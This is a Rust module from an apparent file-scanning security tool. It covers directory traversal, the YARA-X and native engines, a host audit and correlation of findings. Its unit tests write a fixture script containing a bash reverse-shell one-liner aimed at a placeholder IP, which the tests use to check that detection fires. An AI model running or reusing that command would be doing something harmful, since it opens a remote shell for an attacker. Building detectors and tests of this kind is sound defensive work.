//! File and directory traversal, and the scan pipeline.
//!
//! One scan reads each file once, hands the same buffer to YARA-X and the
//! native engine, then optionally runs the host audit and the correlation
//! engine. A directory scan is best-effort: unreadable entries are recorded and
//! the scan continues.
//!
//! Symlinks inside a directory tree are not followed, which avoids loops and
//! unexpected traversal outside the requested root. An explicitly requested
//! symlink to a file is scanned; a symlink to a directory is walked once at its
//! resolved location.

use std::fs;
use std::path::{Path, PathBuf};
use std::time::Instant;

use anyhow::{Context, Result, bail};
use walkdir::WalkDir;

use crate::audit::{self, AuditOptions};
use crate::correlation::CorrelationSet;
use crate::detection::{DetectionEngine, NativeEngine, YaraEngine};
use crate::engine::{FailureKind, RuleSetInfo, ScanFailure, ScanReport, ScanResult, Verdict};
use crate::findings::{Finding, Source};
use crate::utils::{DEFAULT_SCAN_LIMIT, fingerprint_file_with_limit};

/// Directories that are almost never worth scanning and that dominate a
/// repository scan. Users can override the list.
pub const DEFAULT_IGNORED_DIRS: &[&str] = &[
    ".git",
    "node_modules",
    "target",
    "__pycache__",
    ".venv",
    "venv",
    ".mypy_cache",
    ".pytest_cache",
    "dist",
    "build",
    ".cache",
    ".idea",
    ".gradle",
];

/// Which engines to run.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct EngineSelection {
    /// Evaluate YARA-X rules.
    pub yara: bool,
    /// Run the native indicator and structural engines.
    pub native: bool,
    /// Run the Python host audit.
    pub audit: bool,
}

impl Default for EngineSelection {
    fn default() -> Self {
        Self {
            yara: true,
            native: true,
            // The host audit needs Python and is a deliberate opt-in.
            audit: false,
        }
    }
}

/// Options that control how a path is scanned.
#[derive(Debug, Clone)]
pub struct ScanOptions {
    /// Explicit YARA rules directory. `None` uses engine auto-detection.
    pub rules_dir: Option<PathBuf>,
    /// Engine selection.
    pub engines: EngineSelection,
    /// Filesystem root for the audit. Defaults to `/`.
    pub audit_root: Option<PathBuf>,
    /// Optional audit policy file.
    pub audit_policy: Option<PathBuf>,
    /// Audit control ids to skip.
    pub audit_skip: Vec<String>,
    /// Explicit Python interpreter for the audit.
    pub python: Option<PathBuf>,
    /// Evaluate correlation rules over the collected findings.
    pub correlation: bool,
    /// Optional correlation rules file. `None` uses the built-in ruleset.
    pub correlation_file: Option<PathBuf>,
    /// Maximum bytes buffered per file for content engines.
    pub max_scan_bytes: u64,
    /// Directory names to skip anywhere in the tree.
    pub ignore_dirs: Vec<String>,
}

impl Default for ScanOptions {
    fn default() -> Self {
        Self {
            rules_dir: None,
            engines: EngineSelection::default(),
            audit_root: None,
            audit_policy: None,
            audit_skip: Vec::new(),
            python: None,
            correlation: true,
            correlation_file: None,
            max_scan_bytes: DEFAULT_SCAN_LIMIT,
            ignore_dirs: DEFAULT_IGNORED_DIRS
                .iter()
                .map(|name| (*name).to_owned())
                .collect(),
        }
    }
}

/// Scans a file or directory with default options.
pub fn scan_path(path: &Path) -> Result<ScanReport> {
    scan_path_with_options(path, &ScanOptions::default())
}

/// Scans a file or recursively scans a directory.
///
/// Returns an error only when the scan cannot start (for example, the root path
/// is missing or the configured rules cannot be loaded). Per-file and
/// per-directory failures are collected in [`ScanReport::failures`].
pub fn scan_path_with_options(path: &Path, options: &ScanOptions) -> Result<ScanReport> {
    let started = Instant::now();
    let metadata =
        fs::metadata(path).with_context(|| format!("cannot access {}", path.display()))?;

    let yara = if options.engines.yara {
        Some(YaraEngine::new(options.rules_dir.as_deref())?)
    } else {
        None
    };
    let native = if options.engines.native {
        Some(NativeEngine::new().context("failed to initialise the native engine")?)
    } else {
        None
    };

    let rules = yara
        .as_ref()
        .map(|engine| engine.info().clone())
        .unwrap_or_else(|| RuleSetInfo {
            source: "disabled".to_owned(),
            rules_dir: None,
            rule_count: 0,
            demo_rule_count: 0,
        });

    let mut report = ScanReport::new(path.display().to_string(), rules);
    report.engines.yara = yara.is_some();
    report.engines.native = native.is_some();
    if let Some(engine) = &native {
        report.engines.native_version = engine.version().to_owned();
        report.engines.native_rules = engine.rule_count();
    }

    if metadata.is_file() {
        scan_file(path, yara.as_ref(), native.as_ref(), options, &mut report);
    } else if metadata.is_dir() {
        scan_directory(path, yara.as_ref(), native.as_ref(), options, &mut report)?;
    } else {
        bail!("{} is not a regular file or directory", path.display());
    }

    if options.engines.audit {
        attach_audit(&mut report, options);
    }

    if options.correlation {
        let set = match &options.correlation_file {
            Some(file) => CorrelationSet::from_path(file)?,
            None => CorrelationSet::builtin(),
        };
        let correlated = set.evaluate(&report.findings);
        report.correlated = correlated.len();
        report.findings.extend(correlated);
    }

    report
        .findings
        .sort_by(|left, right| left.sort_key().cmp(&right.sort_key()));
    report.refresh_summary();
    report.duration_ms = u64::try_from(started.elapsed().as_millis()).unwrap_or(u64::MAX);
    Ok(report)
}

fn scan_directory(
    path: &Path,
    yara: Option<&YaraEngine>,
    native: Option<&NativeEngine>,
    options: &ScanOptions,
    report: &mut ScanReport,
) -> Result<()> {
    let walk_root = directory_walk_root(path)?;
    let ignored = &options.ignore_dirs;

    let walker = WalkDir::new(&walk_root)
        .follow_links(false)
        .into_iter()
        .filter_entry(|entry| {
            // Never filter the root itself, even when the user explicitly
            // scanned a directory that also appears on the ignore list.
            if entry.depth() == 0 || !entry.file_type().is_dir() {
                return true;
            }
            let name = entry.file_name().to_string_lossy();
            !ignored.iter().any(|candidate| candidate == &name)
        });

    for entry in walker {
        match entry {
            Ok(entry) => {
                if entry.file_type().is_dir() {
                    continue;
                }
                if entry.file_type().is_file() {
                    scan_file(entry.path(), yara, native, options, report);
                } else if entry.depth() > 0 {
                    report.skipped += 1;
                }
            }
            Err(error) => {
                let failed_path = error
                    .path()
                    .map(Path::to_path_buf)
                    .unwrap_or_else(|| path.to_path_buf());
                if error
                    .io_error()
                    .is_some_and(|io| io.kind() == std::io::ErrorKind::PermissionDenied)
                    && failed_path.file_name().is_some_and(|name| {
                        ignored.iter().any(|candidate| name == candidate.as_str())
                    })
                {
                    report.summary.ignored_dirs += 1;
                    continue;
                }
                report.failures.push(ScanFailure {
                    path: failed_path.display().to_string(),
                    kind: FailureKind::Walk,
                    error: error.to_string(),
                });
            }
        }
    }

    Ok(())
}

fn scan_file(
    path: &Path,
    yara: Option<&YaraEngine>,
    native: Option<&NativeEngine>,
    options: &ScanOptions,
    report: &mut ScanReport,
) {
    let fingerprint = match fingerprint_file_with_limit(path, options.max_scan_bytes) {
        Ok(fingerprint) => fingerprint,
        Err(error) => {
            report.failures.push(ScanFailure {
                path: path.display().to_string(),
                kind: FailureKind::Read,
                error: format!("{error:#}"),
            });
            return;
        }
    };

    let display_path = path.display().to_string();
    let mut matches = Vec::new();
    let mut analysis = None;

    if let Some(engine) = yara {
        match engine.scan(path, &fingerprint.content) {
            Ok(found) => matches.extend(found),
            Err(error) => {
                report.failures.push(ScanFailure {
                    path: display_path.clone(),
                    kind: FailureKind::Detect,
                    error: format!("{error:#}"),
                });
            }
        }
    }

    if let Some(engine) = native {
        match engine.analyze(path, &fingerprint.content, fingerprint.truncated) {
            Ok(result) => {
                matches.extend(result.matches);
                analysis = Some(result.analysis);
            }
            Err(error) => {
                report.failures.push(ScanFailure {
                    path: display_path.clone(),
                    kind: FailureKind::Detect,
                    error: format!("{error:#}"),
                });
            }
        }
    }

    matches.sort_by(|left, right| {
        right
            .level
            .cmp(&left.level)
            .then_with(|| (&left.rule, &left.namespace).cmp(&(&right.rule, &right.namespace)))
    });

    let verdict = if matches.is_empty() {
        Verdict::Clean
    } else {
        Verdict::Suspicious
    };

    for rule_match in &matches {
        report.findings.push(rule_match.to_finding(&display_path));
    }

    report.results.push(ScanResult {
        path: display_path,
        sha256: fingerprint.sha256,
        size: fingerprint.size,
        file_type: fingerprint.file_type,
        verdict,
        matches,
        analysis,
    });
}

/// Runs the host audit and merges its findings into `report`.
///
/// Exposed so a caller that combines several scans can run the audit once for
/// the host instead of once per scanned path. An audit failure is recorded as a
/// [`FailureKind::Audit`] failure; it never aborts a content scan.
pub fn attach_audit(report: &mut ScanReport, options: &ScanOptions) {
    let root = options
        .audit_root
        .clone()
        .unwrap_or_else(|| PathBuf::from("/"));

    let audit_options = AuditOptions {
        root: root.clone(),
        policy: options.audit_policy.clone(),
        skip: options.audit_skip.clone(),
        python: options.python.clone(),
    };

    match audit::run(&audit_options) {
        Ok(audit) => {
            let findings = audit.findings();
            report.audit = Some(audit);
            report.engines.audit = true;
            for finding in findings {
                debug_assert_eq!(finding.source, Source::Audit);
                report.findings.push(finding);
            }
        }
        Err(error) => {
            let message = format!("{error:#}");
            report.audit_error = Some(message.clone());
            report.failures.push(ScanFailure {
                path: format!("{} (host audit)", root.display()),
                kind: FailureKind::Audit,
                error: message,
            });
        }
    }
}

fn directory_walk_root(path: &Path) -> Result<PathBuf> {
    let metadata = fs::symlink_metadata(path)
        .with_context(|| format!("failed to inspect {}", path.display()))?;

    if metadata.file_type().is_symlink() {
        path.canonicalize()
            .with_context(|| format!("failed to resolve {}", path.display()))
    } else {
        Ok(path.to_path_buf())
    }
}

/// Converts a report into the findings a caller asked to fail on.
pub fn blocking_findings(report: &ScanReport, level: u8) -> Vec<&Finding> {
    report.findings_at_least(level)
}

#[cfg(test)]
mod tests {
    use super::*;

    const RULES_DIR: &str = concat!(env!("CARGO_MANIFEST_DIR"), "/rules");

    fn options() -> ScanOptions {
        ScanOptions {
            rules_dir: Some(PathBuf::from(RULES_DIR)),
            ..ScanOptions::default()
        }
    }

    #[test]
    fn ignored_directories_are_skipped() {
        let temp = tempfile::tempdir().expect("temp dir");
        let vendor = temp.path().join("node_modules");
        fs::create_dir(&vendor).expect("create vendor dir");
        fs::write(vendor.join("package.js"), "ordinary text").expect("write vendor file");
        fs::write(temp.path().join("app.js"), "ordinary text").expect("write app file");

        let report = scan_path_with_options(temp.path(), &options()).expect("scan");
        assert_eq!(report.results.len(), 1);
        assert!(report.results[0].path.ends_with("app.js"));
    }

    #[test]
    fn ignoring_can_be_disabled() {
        let temp = tempfile::tempdir().expect("temp dir");
        let vendor = temp.path().join("node_modules");
        fs::create_dir(&vendor).expect("create vendor dir");
        fs::write(vendor.join("package.js"), "ordinary text").expect("write vendor file");

        let report = scan_path_with_options(
            temp.path(),
            &ScanOptions {
                ignore_dirs: Vec::new(),
                ..options()
            },
        )
        .expect("scan");
        assert_eq!(report.results.len(), 1);
    }

    #[test]
    fn findings_are_collected_from_both_content_engines() {
        let temp = tempfile::tempdir().expect("temp dir");
        let shell = temp.path().join("run.sh");
        fs::write(
            &shell,
            "#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.7/4444 0>&1\n",
        )
        .expect("write fixture");

        let report = scan_path_with_options(&shell, &options()).expect("scan");
        assert!(report.engines.native);
        assert!(report.engines.native_rules >= 30);
        let ids = report
            .findings
            .iter()
            .map(|finding| finding.id.as_str())
            .collect::<Vec<_>>();
        assert!(ids.contains(&"TVX-NAT-007"), "{ids:?}");
        assert!(ids.iter().any(|id| id.starts_with("TVX-CORR")));
        assert_eq!(report.summary.scanned, 1);
        assert!(report.summary.risk_score > 0);
    }

    #[test]
    fn correlation_can_be_disabled() {
        let temp = tempfile::tempdir().expect("temp dir");
        let shell = temp.path().join("run.sh");
        fs::write(
            &shell,
            "#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.7/4444 0>&1\n",
        )
        .expect("write fixture");

        let report = scan_path_with_options(
            &shell,
            &ScanOptions {
                correlation: false,
                ..options()
            },
        )
        .expect("scan");
        assert_eq!(report.correlated, 0);
        assert!(
            !report
                .findings
                .iter()
                .any(|finding| finding.source == Source::Correlation)
        );
    }

    #[test]
    fn a_missing_root_is_a_startup_error() {
        let temp = tempfile::tempdir().expect("temp dir");
        let error = scan_path_with_options(&temp.path().join("missing"), &options())
            .expect_err("missing root");
        assert!(format!("{error:#}").contains("cannot access"));
    }

    #[test]
    fn engines_can_be_disabled() {
        let temp = tempfile::tempdir().expect("temp dir");
        let file = temp.path().join("text.txt");
        fs::write(&file, "ordinary text").expect("write");
        let report = scan_path_with_options(
            &file,
            &ScanOptions {
                engines: EngineSelection {
                    yara: false,
                    native: false,
                    audit: false,
                },
                ..options()
            },
        )
        .expect("scan");
        assert!(!report.engines.yara);
        assert!(!report.engines.native);
        assert_eq!(report.results.len(), 1);
        assert!(report.results[0].matches.is_empty());
        assert_eq!(report.rules.rule_count, 0);
    }
}
